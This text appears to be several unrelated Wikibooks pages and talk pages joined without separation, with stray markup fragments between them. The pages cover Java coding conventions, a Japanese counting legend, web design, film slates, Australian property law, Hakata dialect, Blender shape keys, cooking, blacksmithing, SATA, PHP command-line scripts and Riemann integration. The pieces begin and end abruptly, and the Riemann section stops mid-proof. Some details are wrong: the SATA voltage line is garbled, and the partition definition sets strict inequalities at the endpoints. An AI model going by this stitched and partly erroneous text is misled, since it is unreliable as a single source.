*Make your code '''abstract''', in case the same method needs to be implemented in more than one place.
*Any other general standards for coding well should be used.

In conclusion, '''plan ahead'''. It's much better to spend five minutes planning ahead than to spend hours going back through your code because you made a logistical mistake in the very beginning.

== Java and JSP ==
Sun Microsystems has published a widely used set of coding conventions for [http://java.sun.com/docs/codeconv/ Java] and [http://java.sun.com/developer/technicalArticles/javaserverpages/code_convention/index.html JSP].

A very good automated tool for enforcing Java coding conventions is [http://checkstyle.sourceforge.net/ checkstyle]. This tool is highly configurable.

Existing code can be reformatted using tools such as [http://jalopy.sourceforge.net/ Jalopy] or [http://www.tiobe.com/jacobe.htm Jacobe].

Use the javadoc tool included in the Java SDK to document your code.

Automated unit tests can be built using [http://junit.sourceforge.net/ Junit]. [http://www.junitdoclet.org/ JUnitDoclet] is a useful addition to JUnit. Use [http://httpunit.sourceforge.net/ HttpUnit] to automate web page testing.

All the tasks above can be integrated using [http://ant.apache.org/ ANT].

== Amaterasu legend ==

I've [http://en.wikibooks.org/w/index.php?title=Japanese/Numbers&amp;diff=1463829&amp;oldid=1463696 removed] the following from the page:
: There is a legend that the sun goddess [[Wikipedia:Amaterasu|Amaterasu]] once hid herself in a cave, which led to darkness on Earth. Trying to get her back, other gods gathered around the cave and decided that another goddess should perform a ritual dancing to make Amaterasu wonder what is happening outside, and step out of the cave. During this ritual, a god Ame no Koyate no Mikoto prayed for Amaterasu to come out. He said &quot;ひ&quot; and other gods replied &quot;とつ&quot;, he said &quot;ふ&quot; and other continued &quot;たつ&quot;, he said &quot;み&quot;, and they added &quot;つ&quot;. Then the same answer was for &quot;と&quot;, &quot;いつ&quot;, &quot;む&quot;, &quot;なな&quot;, &quot;や&quot; and &quot;ここの&quot;. The last word all the gods said together: &quot;とを&quot;.
:The origin of these words are a mystery, but some scholars believe they have Hebrew roots, and even attempt (rather successfully) to translate them like if they were said in Hebrew.{{citation needed}}
:These words became the first Japanese counting words. Their reading is called kunyomi (訓読み, くんよみ) and they are now pronounced as:

Checking online, the only source I could find was [http://www5.ocn.ne.jp/~magi9/isracame.htm this] bit of original research. If someone wants it in, we're going to need something more substantial. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 21:57, 9 April 2009 (UTC)</text>

&lt;/table&gt;
&lt;/div&gt;

A website should have a unified graphic theme, as well as a tone and general '''feel'''. If a &quot;professional feel&quot; is what you're going for&amp;mdash;if you're trying to sell a professional product or service, like web design&amp;mdash;then aim for a professional look and design, and write the content with a professional tone. It's hard to describe because the concepts are often abstract, but a good designer can come up with a look and feel for any theme.

Besides helping the user subconciously identify your website with a general category (professional, playful, serious, etc.), it's important to have a unified theme so that the user knows when they're actually at your website. That is, from a cognitive psychological view: if a user clicks a link, he should know whether he is still at your website or if the link has taken him to an external site.

Distinct and unique &quot;logo types&quot; (amazon.com, ebay, Microsoft, RollingStone Magazine) stay with a user. They are instantly recognizable and also lend an appropriate air to the content they represent.

It can take a long time to develop and decide upon a theme, but the visual aspect of a website is just as important as the backend and is an essential part of the user's experience.

      <text xml:space="preserve">You can use a clapper board to identify which scenes you wish to include. For example, you could write the TAKE number and the SCENE number, so while editing you can just select the thumbnail with the information you selected to include in your final movie, and trim the scene and add it to the final movie.
In North America, the clapper is referred to as a slate.  It's use is as follows.  The assistant cameraperson &quot;AC&quot; asks the script supervisor which scene and take is up.  This is written on the slate with either chalk or marker.  If there is sound recorded, then the clapper sticks are hit together so the editor has both a visual cue (the first film frame with the sticks together) and a sound cue (the clap).  
It is often perceived that the slate is always clapped, but for much of the film there is no sound (only necessary for synronizing the actors lips with their dialogue) and the slate is put in frame closed.
Slating is the last thing that happens before the action can start, however in some circumstances where it's unclear when the event might happen (as an explosion) the camera will be slated or &quot;marked&quot; at the end of the action, called an &quot;end-slate.&quot;

Property is both a legal concept and a social institution. This textbook focuses on the former, examining legal principles and rules regulating the creation, transfer and enforceability of interests in property. Nevertheless, it is impossible to understand property law in isolation from its historical, economic and social context. 

All human societies have rules to control access to valuable resources. These rules vary according to the nature and needs of the particular society. The rules governing property in traditional societies, for instance, differ greatly from those of contemporary societies. 

Large differences may exist between industrialized societies. The best example is the difference, until recently, between capitalist and communist societies with regard to private property. Most countries today have mixed economies in which some resources are privately owned, some assets are owned by the state and free enterprise is subjected to some state regulation. In Australia, private property predominates, though certain resources such as beaches and public parks, are treated as common property.

In Australia, private property in land was introduced in 1788, displacing systems of Aboriginal law based on common ownership. In ''Mabo v Queensland'', the High Court of Australia recognised Aboriginal customary rights to land for the first time.

      <text xml:space="preserve">These examples are mainly from Hakata-ben (Fukuoka dialect).


an sa instead of ano ne (hey, listen up...) 

asobanne instead of asobou (let's play) 

batten instead of da kedo (but) 

da ken instead of da kara (therefore) 

yokaroumon instead of yoi deshou (good, don't you think?) 

bari instead of totemo (very) 

shitoocchan instead of shiterunda (I've done/finished it) 

shiyoocchan instead of shiterunda (I'm doing it)

~shitokiiyo instead of shite okinasai (please do ~; used with children) 

tottouto instead of totte imasu (to take) 

yokka yokka instead of daijoubu (ok; no problem)


To form affirmative sentences, add ~bai to end of the standard Japanese sentence. 
Tokyo ni iku yo = Tokyo ni iku bai. (I go to Tokyo.) 

To form interrogative sentences, add ~to to end of the standard Japanese sentence. 
Doko ni iku no? = Doko ni iku to? (Where do you go to?) 

For adjectives only, change the last ~i of the adjective to ~ka when expressing one word. 
Sore wa minikui. = Sore wa miniku ka. (That's ugly.) 


Useful words: 
I/ me = uchi (Mainly used by women)
you = aata
no = innya 
yes = yoka
like = suitoh
don't like = sukan


I like Hakata ben.
=Hakata ben suitoh. (in Hakata ben)

Kagoshima ben is difficult.
=Kagoshima ben'na mutsukashika. (in old Hakata ben)

I will be right there!
=ima kara kukken!

== Introduction: ==
This tutorial is meant to stop all the RVK (Relative Vertex Keys) questions.

== Window Layout: ==
Set the left half of the screen as 3D View. The other half is divided in two. The top is Action and the bottom is IPO (set to vertex display).


== Setting your Neutral Pose ==
Make sure you are on the first frame (a).
With the cursor over the 3D View, select the mesh you want to animate. (mesh in object mode) and press the I key. Select Mesh from the pop up menu then Relative Keys from the next pop up menu. A line will appear in the IPO view. This line is your neutral pose.

== Setting up your additional Pose Lines ==
Now, figure out how many key frames you will need. If you want to move both eyebrows up and down then you will need 4 additional IPO lines.

Left Brow Up
Left Brow Down
Right Brow Up
Right Brow Down

Press the up arrow (cursor key) to move to forward 10 frames. Press the I key while over the 3D View and select Mesh. Repeat until you see a total of 5 lines in the IPO window.

== Set your Poses ==
Right click on the Neutral pose line in the IPO window. This sets the mesh to the neutral pose.
Now Right click on the next line up in the IPO window. Enter edit mode in the 3D View and move the vertices as desired (in this case you will be moving verts to get the left Brow up pose). Press Tab to exit edit mode. Now right click your Neutral pose line in the IPO window. You will see your object in its neutral state. Right click the next line up and you should see the changes you just made to your object. Set up all your mesh poses following the above instructions.

== Name your Poses ==
RIght click on the Key names in the Action window. Change the name and click OK.

== Time to Animate (b) ==
Click on the arrow next to the Sliders text. This will give you access to the pose sliders.
Move to frame 20 to start your action. Move the pose slider but release the mouse when set to 0. Now move 10 frames forward and move the same slider to 1.00 (maximum). Use this method to set up all your actions(c). Remember to add a 0 value frame to end the pose.(d).

== Adjust your Slow in &amp; Out ==
In the IPO View select from the menu to find the IPO curves. You can get back to the Pose lines by selecting KeyIPO from the same menu. Right click the spline you want to edit and press TAB to enter edit mode. Move the handles to adjust slow in/out.(e)

(a) In this case moving to a frame has nothing to do with animation. It is done so that your pose lines are separate from each other.
(b) Select your key frame marker and use the usual commands to move &lt;g&gt; and duplicate &lt;d&gt; them.
(c) Be subtle by not pushing the slider all the way to 1.00.
(d) Try overlapping your poses.
(e) When setting slider values they can sometimes go into the negative value. This will give you weird results. Although sometimes they can make your animation more interesting. To fix this edit the IPO, select the point where the line dips below zero and press the V key. Do the same at the other end of the curve if needed.

Warning! Blender has a limit to the number of verts you can use.

To '''julienne''' a vegetable or other ingredient is to cut it into long thin matchstick-sized strips 1/16th to 1/8th of an inch wide and 2-3 inches long. A baton is larger, almost 1/4 inch wide.

To julienne a carrot, first cut it into cylindrical sections of the desired length. Trim each section so that the sides are straight and right-angled (almost like a cuboid). Slice into flat panels of desired width. Stack these panels and slice evenly into matchsticks.

Julienne is also a name given to a consomme garnished with julienned vegetables.

[[image:John Neagle 001.jpg|400px|right]]
''Down'n'Dirty Blacksmithing'' is intended to be a practical introduction to the craft of blacksmithing through the construction of a primitive forge, tools to work the metal heated in the forge, and basic projects.

We hope that this book will provide information through text and illustrations so that an individual might:

* Acquire necessary tools and materials.
* Build a primitive forge.
* Build a primitive [[/Tools, Materials, and Supplies#Anvil|anvil]].
* Successfully light a fire in the forge that will bring steel to a working temperature.
* Work steel with tools made and acquired in a series of graded exercises that will give an individual an introduction to the rudiments of blacksmithing.
* Work steel in a series of graded exercises that will continue the individual's introduction to the rudiments of blacksmithing and provide additional tools for the further exploration of the craft.

      <text xml:space="preserve">==Something==
I've had this in mind for some time.
What I'm after with this book is described in the introduction (which needs polish). 
I hope to take advantage of modules in Wikipedia on Metalwork, Forge, and Blacksmith to flesh this out quickly. The core work of this is not to write from scratch, but to create a core of one very simple way to set up a working forge and basic tools and make some simple, useful things.
My further hope is that some of the other smiths on the web will eventually find this and contribute, not only to this book and wikipedia, but perhaps more and more specialized modules on various processes, tools, materials and the like.
I want to emphasize that in this book what should be covered is ''a'' way to do things. Not ''the'' way. Not even, necessarily the ''best'' way. What is described at points may be very localized and specific. 
I believe that if it is basic and essential enough in descriptions those who are interested and motivated will be able to make appropriate substitutions to suit their environment.
A secondary but still significant goal is that there are enough links and cross references to existing resources on Wiki and externally that one more starting point for this in the internet is created. 
Yet another goal is that this is modular enough and motivating enough that others are motivated to assist in filling the gaps that must exist in a topic like this.

== Nice start ==

Erraunt, this is a nice start.  I made a few minor changes to some of the sentences, and some spelling changes as well.  This is an interesting topic and I hope to see more soon.  Thanks for your work. --[[User:Vern|Vern]] 19:45, 8 Mar 2005 (UTC)
Thanks, Vern. Your changes are appreciated. I'm passing the word to some of my smithing friends as well. The more input the better. Even starting to daydream a bit about what will follow. I look forward to this growing and to whatever you might choose to offer. --[[User:erraunt|erraunt]]

== Continuing the work ==

I fleshed out some of the earlier sections quite a bit and started putting in more links back to Blacksmithing and Metalworking in Wikipedia.

I hope to get to the &quot;Building&quot; and initial projects pages in the next two weeks.

I don't want to restrict anyone from contributing to this in the slightest but I would ask if you're going to add significantly to this book that you read the introduction and objectives and consider keeping what you add in line with the goal of a simple, primitive forge and anvil as the basis for what is accomplished here. 

I don't want to exclude such additions but that is why I chose &quot;Down'n'Dirty&quot; for the title and guiding philosophy. If there is interest I  have interest in a second book with more advanced techniques using more refined tools made or otherwise acquired. 

But the goal here is to let someone have a taste and do some basic work with the least outlay possible so that they could decide if it was for them and worth the investment in proper anvil, leg vice, forge, bellows and the like.

My other hope is that once the weather warms (it's early March and I'm in Minneapolis as I write this) a few of us can get together and actually work through what is here with a camera present both to test the content and to create images to illustrate the process.
[[User:Erraunt|erraunt]]

== If You are Willing to Help ... ==

I've got a fairly clear idea of where I want to go with the body of this book. 

If you're inclined and have a little time, things that would be really helpful would be:

1) checking Wikipedia for useful entries to link to from this book. &lt;i&gt; The more that we can use other modules from elsewhere in the Wiki world the more time there is for writing on new things.&lt;i&gt;

2) Creating or expanding Wikipedia entries where there are none or only stubs. For example, while there is a Wikipedia entry for &quot;hammers&quot; it wasn't linked to Metalworking and didn't include cross-peen hammers. So I've added cross-peen to hammers (but it's a stub) and put a link to &quot;hammers&quot; in &quot;Metalwork&quot;. Things like that would be great.

3) I'm not sure where it would best be put but creating a bibliography of good books on blacksmithing would be outstanding. Please add your favorites. Probably in the Wikipedia entry on Blacksmithing would be best.

4) If you have any photographs of blacksmith tools, or know where public domain images of the same are available, that would be really great. Writing about blacksmithing is a poor third best to hands on. Photographs and sketches will work to bring this to &quot;second best&quot; which is about the best we can do in a 2 dimensional medium (although I'll admit I daydream about a VR smithy ... ). 

5) If you have worked a primitive forge or try any of the projects and such in here, please feed back your results and questions. I'd love to hear about it either here or in a direct e-mail.

Thanks to those who have contributed by direct editing or stopping by!

== More additons, Contemplated Changes ==

Added more text today. 

Realized that it's beyond 32 KB (or MB?) and that might be too much for some browsers.

Should break out some of the sections and link to them. That will have to be a project for another day.

Apologies to any who try to edit it until I get to that.

[[User:Erraunt|erraunt]]

== Break Out into Modules ==

Got the message this weekend that the main book is now over 32 KB and could cause problems for some browsers.

This combined with my growing feeling that the size is getting cumbersome has got me thinking about ways to modularize this work.

My current thought is to migrate this toward a main heading on the bookshelf of &quot;Blacksmithing&quot;. &quot;Down'n'Dirty Blacksmithing&quot; will be one title under that.

The excercises and projects will be modules as links from the core book. 

Ultimately this will be both easier to edit and more useful. 

I'm giving thought to an organization and will post that in a few days (hopefully).

If others have thoughts, please comment.  --[[User:Erraunt|Erraunt]], ~Mar ***, 2005

Hi.  I've split the tools section from this book, probably will do more.  Very interesting and informative book, by the way.  I used to be really interested in blacksmithing, ~12 years ago(8yrsOld).  It's probably illegal here though.  And it sounds hard to forge circuitry.. [[User:Snargle|Snargle]] 04:44, 1 August 2005 (UTC)

Thanks for your interest, Snargle. I hope to do more with it when not quite so busy. [[User:Erraunt|erraunt]] 15:37, 30 August 2005 (UTC)

== Images ==
I've found a picture source on http://commons.wikimedia.org/wiki/Category:Smiths --[[User:Snargle|Snargle]] 09:53, 1 August 2005 (UTC)

== Added a bit on &quot;Drawing&quot;... ==

...which I hope is not taken amiss.  My technical skill (as a smith) are pretty weak, but I've made almost every mistake you can (but no severe burns!).

Thanks for doing this, I hope I can help and that it is taken as such, not as an intrusion.

== Comment == 

Hi there. This book looks interesting, and very well written. I myself am currently working on the [[Welding]] wikibook, but it is going fairly slow... Its just me writing it so far. I came around searching for blacksmithing (as I am writing a 'history' section in mine,) and I found lots, but not really history. Anyway, wonderful topic, great job!

== Introduction ==

S-ATA or Serial ATA

Is a new technology to replace the P-ATA or parallel ATA.

It has the following advantages:

* less power consumption 500 millivolts in P_ATA 5 volts.
* easy to install, without seting master and slave.
* good air movement replacing ribbon cable to guarantee good air flow.

{{recipe}} | [[Cookbook:Sandwiches|Sandwiches]]

The '''b'''acon, '''l'''ettuce and '''t'''omato sandwich, commonly referred to as the '''BLT''', is a classic sandwich that can be found almost everywhere.

==Ingredients==
*[[Cookbook:Bacon|bacon]], sliced in rashers
*[[Cookbook:Lettuce|lettuce]], washed and shredded, torn, or in whole leaves
*ripe [[Cookbook:Tomato|tomato]], sliced into thin disks
*two slices of any type of [[Cookbook:Bread|bread]]
*sandwich spread or condiments (e.g., [[Cookbook:Butter|butter]], [[Cookbook:Margarine|margarine]], [[Cookbook:Mayonnaise|mayonnaise]], [[Cookbook:Cream Cheese|cream cheese]], or [[Cookbook:mustard|mustard]], although mayonnaise is traditional)
*ground [[Cookbook:Pepper|black pepper]], if desired

==Procedures==
#[[Cookbook:Toasting|Toast]] the two slices of bread.
#While the bread is toasting [[Cookbook:Broiling|broil]] or [[Cookbook:Frying|fry]] the bacon until crisp, taking care not to burn it.
#Once the toasted bread is ready, spread with desired condiments.
#Layer one slice of toast with the lettuce, tomato slices, and bacon. Add black pepper as desired. Top with other slice of toast.
#Cut into triangles or halves as preferred. Serve ''immediately''.

==Notes, tips, and variations==
*The lettuce, if shredded, may be mixed with the mayonnaise before layering the toast.
*The lettuce may be omitted, or another green substituted. [[Cookbook:watercress|Watercress]] is a nice addition.
*You may add slivers of ripe [[Cookbook:avocado|avocado]] or raw or cooked red [[Cookbook:onion|onion]] to the sandwich, or may substitute them for the lettuce or tomato.
*You may top the hot bacon in the sandwich with a slice of [[Cookbook:cheese|cheese]], such as cheddar, American, muenster, or pepper jack, or use it to replace the tomato (a sandwich prepared in this way is called a BLC sandwich, for &quot;bacon, lettuce, and cheese.&quot;)
*You may place a fried [[Cookbook:egg|egg]] in the sandwich. If the egg is fried over-easy or sunny-side-up, the egg's [[Cookbook:Egg yolk|yolk]] may be broken just before serving so that it dresses the contents of the sandwich. 
*The slices of bread do not need to be toasted, although toast adds a nice texture.
*You may spread the bread with [[Cookbook:Peanut Butter|peanut butter]] for an interesting variation.
*You may top the sandwich or its contents with [[Cookbook:Hollandaise Sauce|hollandaise sauce]].
*Add [[Cookbook:ham|ham]], [[Cookbook:turkey|turkey]] and [[Cookbook:Swiss Cheese|Swiss cheese]] for a BLT club sandwich.
*For a [[Cookbook:vegan|vegan]] variation on the BLT, use marinated and fried or grilled strips of [[Cookbook:tempeh|tempeh]] to substitute for the bacon. Vegetable protein-based false bacon products are also available in some grocery freezers. Use mayonnaise, a vegan mayonnaise substitute, in place of the mayo.
*A BLT sandwich can also be served on a (non-toasted) hot dog bun or larger variation thereof (although in this case the bacon, lettuce, and tomato should all be shredded.)

==Warnings==
Take care when frying the bacon to avoid a grease fire. (Should one occur, '''do not''' douse the flames with water, as this will cause the fire to spread; instead, cover the pan tightly or heap with baking soda to smother the flames, and remove from the heat.)

Contrary to popular belief, PHP is not just a web server language. PHP can also be used to create ''regular'' programs. PHP can be used to create GUI applications, shell scripts, and even daemons, among other things.

The boon is that all (or most) of the usual PHP libraries are available to your PHP CLI program too. MySQL, XML, etc. It's all (or mostly) still available.

== Example PHP-CLI Program ==
Below is an example PHP-CLI program:

&lt;nowiki&gt;
 &lt;?php
   print('Hello World');
 ?&gt;
&lt;/nowiki&gt;

If we saved this as &quot;helloworld.php&quot;, then we'd run this PHP CLI program via the command:
 php helloworld.php

This would produce the output:
 Hello World

== Difference Between PHP and PHP CLI ==
There are some important differences between ''server-side'' PHP and PHP CLI. Here's a list of them:
# There is no &lt;code&gt;$_GET&lt;/code&gt; super global array.
# There is no &lt;code&gt;$_POST&lt;/code&gt; super global array.
# There is no &lt;code&gt;$_COOKIE&lt;/code&gt; super global array.
# When you do a ''print'', the output goes to the ''standard output'' and not a web browser.
# You can get ''command line arguments'' via the &lt;code&gt;$argv&lt;/code&gt; variable.
# You can get the ''number of command line arguments'' via the &lt;code&gt;$argc&lt;/code&gt; variable.

== Using &lt;code&gt;argv&lt;/code&gt; and &lt;code&gt;argc&lt;/code&gt; ==
Like many programs, it is necessary to access the command line variable used to invoke the program. To do this in PHP we have two variables:

With &lt;code&gt;register_globals = on;&lt;/code&gt; in the php.ini file one can use:
* &lt;code&gt;$argv&lt;/code&gt;
* &lt;code&gt;$argc&lt;/code&gt;

With &lt;code&gt;register_globals = off;&lt;/code&gt; in the php.ini file one can use:
* &lt;code&gt;$_SERVER['argv']&lt;/code&gt;
* &lt;code&gt;$_SERVER['argc']&lt;/code&gt;

(For those know Bash, C or C++ program languages. they'll find these pair of variables to be very familiar)

Below is an program that makes use of the &lt;code&gt;$argc&lt;/code&gt; and &lt;code&gt;$argv&lt;/code&gt; variables:

&lt;nowiki&gt;
 &lt;?php 
   print('ARGC = ' . $argc .&quot;\n\n&quot;);
   foreach ($argv as $k=&gt;$v) {
     print(&quot;ARGV[$k] = $v\n&quot;);
   }
 ?&gt;
&lt;/nowiki&gt;

&lt;nowiki&gt;
 &lt;?php 
   print('ARGC = ' . $_SERVER['argc'] .&quot;\n\n&quot;);
   foreach ($_SERVER['argv'] as $k =&gt; $v) {
     print(&quot;ARGV[$k] = $v\n&quot;);
   }
 ?&gt;
&lt;/nowiki&gt;

If we save this PHP program as &quot;test1.php&quot;, and ran it with:
    php test1.php apple orange banana pineapple
Then we'd get:
    ARGC = 4
    
    ARGV[0] = test1.php
    ARGV[1] = apple
    ARGV[2] = orange
    ARGV[3] = banana
    ARGV[4] = pineapple

(Note that like in Bash, C and C++ programs, the first element of &lt;code&gt;$argv&lt;/code&gt; is the name of the program.)

==Definition==

Riemann integration is the formulation of integration most people think of if they ever think about integration. It is the only type of integration considered in most calculus classes; many other forms of integration, notably Lebesgue integrals, are extensions of Riemann integrals to larger classes of functions. The Riemann integral was developed by [[w:Bernhard Riemann|Bernhard Riemann]] in 1854 and was, when invented, the first rigorous definition of integration applicable to not necessarily continuous functions.

We will first define some preliminary ideas.

==Partitions==
===Definition===
Let &lt;math&gt;a,b\in\mathbb{R}&lt;/math&gt;

A '''Partition''' &lt;math&gt;\mathcal{P}&lt;/math&gt; is defined as the ordered ''n-tuple'' of real numbers &lt;math&gt;\mathcal{P}=(x_0,x_1,x_2,\ldots ,x_n)&lt;/math&gt; such that &lt;math&gt;a&lt;x_0&lt;x_1&lt;x_2&lt;\ldots &lt;x_n&lt;b&lt;/math&gt;

===Norm of a Partition===
Let &lt;math&gt;\mathcal{P}&lt;/math&gt; be a partition given by &lt;math&gt;\mathcal{P}=(x_0,x_1,x_2,\ldots ,x_n)&lt;/math&gt;

Then, the '''Norm''' (or the &quot;mesh&quot;) of &lt;math&gt;\mathcal{P}&lt;/math&gt; is defined as &lt;math&gt;\|\mathcal{P}\| =\sup \{x_{k+1}-x_k|0\leq k\leq n-1\}&lt;/math&gt;

===Tagged Partition===
Let &lt;math&gt;\mathcal{P}=(x_0,x_1,x_2,\ldots ,x_n)&lt;/math&gt; be a partition

A '''Tagged Partition''' &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; is defined as the set of ordered pairs &lt;math&gt;\mathcal{\dot{P}}=\{([x_{i-1},x_i],t_i)\}_{i=1}^n&lt;/math&gt; such that &lt;math&gt;x_{i-1}\leq t_i\leq x_i&lt;/math&gt;. The points &lt;math&gt;t_i&lt;/math&gt; are called '''Tags'''.

==Riemann==
[[Image:Integral Riemann sum.png|thumb|180px|Riemann sum of a function]]
===Riemann Sums===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;

Let &lt;math&gt;\mathcal{\dot{P}}=\{([x_{i-1},x_i],t_i)\}_{i=1}^n&lt;/math&gt; be a tagged partition of &lt;math&gt;[a,b]&lt;/math&gt;

The '''Riemann Sum''' of &lt;math&gt;f&lt;/math&gt; over &lt;math&gt;[a,b]&lt;/math&gt; with respect to &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; is given by

&lt;math&gt;S(f,\mathcal{\dot{P}})=\displaystyle\sum_{i=1}^n f(t_i)(x_i-x_{i-1})&lt;/math&gt;

===Riemann Integral===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;

Let &lt;math&gt;L\in\mathbb{R}&lt;/math&gt;

We say that &lt;math&gt;f&lt;/math&gt; is '''Integrable''' on &lt;math&gt;[a,b]&lt;/math&gt; if and only if for every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, there exists &lt;math&gt;\delta&gt;0&lt;/math&gt; such that for every partition &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt;, we have that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|&lt;\varepsilon&lt;/math&gt;

&lt;math&gt;L&lt;/math&gt; is said to be the '''integral''' of &lt;math&gt;f&lt;/math&gt; over &lt;math&gt;[a,b]&lt;/math&gt;, and is written as 

&lt;math&gt;L=\int_a^b f(x)dx&lt;/math&gt; or as &lt;math&gt;L=\int_a^b f&lt;/math&gt;

==Properties==
===Theorem (Uniqueness)===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt; be integrable on &lt;math&gt;[a,b]&lt;/math&gt;

Then the integral &lt;math&gt;L&lt;/math&gt; of &lt;math&gt;f&lt;/math&gt; is unique
====Proof====
Assume, if possible that &lt;math&gt;L_1\neq L_2&lt;/math&gt; are both integrals of &lt;math&gt;f&lt;/math&gt; over &lt;math&gt;[a,b]&lt;/math&gt;. Consider &lt;math&gt;\varepsilon=\tfrac{|L_1-L_2|}{2}&lt;/math&gt;

As &lt;math&gt;L_1,L_2&lt;/math&gt; are integrals, there exist &lt;math&gt;\delta_1,\delta_2&gt;0&lt;/math&gt; such that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L_1|&lt;\varepsilon&lt;/math&gt; for all &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; that satisfy &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta_1&lt;/math&gt; and &lt;math&gt;|S(f,\mathcal{\dot{P}})-L_2|&lt;\varepsilon&lt;/math&gt; for all &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; that satisfy &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta_2&lt;/math&gt;

Let &lt;math&gt;\delta=\inf\{\delta_1,\delta_2\}&lt;/math&gt;. Hence, if &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; is a partition satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt;, then we have &lt;math&gt;|S(f,\mathcal{\dot{P}})-L_1|&lt;\varepsilon&lt;/math&gt; and that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L_2|&lt;\varepsilon&lt;/math&gt;

That is, &lt;math&gt;|L_1-L_2|&lt;2\varepsilon =|L_1-L_2|&lt;/math&gt;, which is an obvious contradiction. Hence the integral &lt;math&gt;L&lt;/math&gt; of &lt;math&gt;f&lt;/math&gt; is unique.


We now state (without proof) two seemingly obvious properties of the integral.

===Theorem===
Let &lt;math&gt;f,g:[a,b]\to\mathbb{R}&lt;/math&gt; be integrable and let &lt;math&gt;c\in (a,b)&lt;/math&gt;

Then:

(i)&lt;math&gt;\int_a^b f+\int_a^b g=\int_a^b f+g&lt;/math&gt;

(ii)&lt;math&gt;\int_a^c f+\int_c^b f=\int_a^b f&lt;/math&gt;

===Theorem (Boundedness Theorem)===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt; be Riemann integrable. Then, &lt;math&gt;f&lt;/math&gt; is bounded over &lt;math&gt;[a,b]&lt;/math&gt;
====Proof====
Assume if possible that &lt;math&gt;f&lt;/math&gt; is unbounded. For every &lt;math&gt;n\in\mathbb{N}&lt;/math&gt; divide the interval &lt;math&gt;[a,b]&lt;/math&gt; into &lt;math&gt;n&lt;/math&gt; parts. Hence, for every &lt;math&gt;n\in\mathbb{N}&lt;/math&gt;, &lt;math&gt;f&lt;/math&gt; is unbounded on at least one of these &lt;math&gt;n&lt;/math&gt; parts. Call it &lt;math&gt;I_n&lt;/math&gt;. 

Now, let &lt;math&gt;\varepsilon&gt;0&lt;/math&gt; be given. Consider an arbitrary &lt;math&gt;\delta&gt;0&lt;/math&gt;. Let &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; be a tagged partition such that &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt; and &lt;math&gt;(I_n,t_n)\in\mathcal{\dot{P}}&lt;/math&gt;, where &lt;math&gt;t_n&lt;/math&gt; is taken so as to satisfy &lt;math&gt;|f(t_n)|&gt;n\varepsilon&lt;/math&gt;. 

Thus we have that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|&gt;\varepsilon&lt;/math&gt;. But as &lt;math&gt;\delta&gt;0&lt;/math&gt; is arbitrary, we have a contradiction to the fact that &lt;math&gt;f&lt;/math&gt; is Riemann integrable.

Hence, &lt;math&gt;f&lt;/math&gt; is bounded.

==Integrability==
We now study classes of Riemann integrable functions. The first &quot;constraint&quot; on Riemann integrable functions is provided by the Cauchy Integrability Criterion.
 
===Theorem (Cauchy Criterion)===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;

Then, 

(i)&lt;math&gt;f&lt;/math&gt; is Riemann integrable on &lt;math&gt;[a,b]&lt;/math&gt; if and only if 

(ii) For every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, there exists &lt;math&gt;\delta&gt;0&lt;/math&gt; such that if &lt;math&gt;\mathcal{\dot{P}},\mathcal{\dot{Q}}&lt;/math&gt; are two partitions satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|,\|\mathcal{\dot{Q}}\|&lt;\delta&lt;/math&gt; then &lt;math&gt;|S(f,\mathcal{\dot{P}})-S(f,\mathcal{\dot{Q}})|&lt;\varepsilon&lt;/math&gt;
====Proof====
(&lt;math&gt;\Rightarrow&lt;/math&gt;)Let &lt;math&gt;\int_a^b f=L&lt;/math&gt; and let &lt;math&gt;\varepsilon&gt;0&lt;/math&gt; be given. 

Then, there exists &lt;math&gt;\delta&gt;0&lt;/math&gt; such that for every partition &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt;,we have &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|&lt;\tfrac{\varepsilon}{2}&lt;/math&gt;

Now, let partitions &lt;math&gt;\mathcal{\dot{P}},\mathcal{\dot{Q}}&lt;/math&gt; be such that &lt;math&gt;\|\mathcal{\dot{P}}\|,\|\mathcal{\dot{Q}}\|&lt;\delta&lt;/math&gt;. 

Thus we have that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|,|S(f,\mathcal{\dot{Q}})-L|&lt;\tfrac{\varepsilon}{2}&lt;/math&gt;, that is &lt;math&gt;|S(f,\mathcal{\dot{P}})-S(f,\mathcal{\dot{Q}})|&lt;\varepsilon&lt;/math&gt;

(&lt;math&gt;\Leftarrow&lt;/math&gt;) For every &lt;math&gt;n\in\mathbb{N}&lt;/math&gt;, consider &lt;math&gt;\delta_n&gt;0&lt;/math&gt; such that for all partitions &lt;math&gt;\mathcal{\dot{P}},\mathcal{\dot{Q}}&lt;/math&gt; satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|,\|\mathcal{\dot{Q}}\|&lt;\delta_n&lt;/math&gt;, we have &lt;math&gt;|S(f,\mathcal{\dot{P}})-S(f,\mathcal{\dot{Q}})|&lt;\tfrac{1}{n}&lt;/math&gt;. 

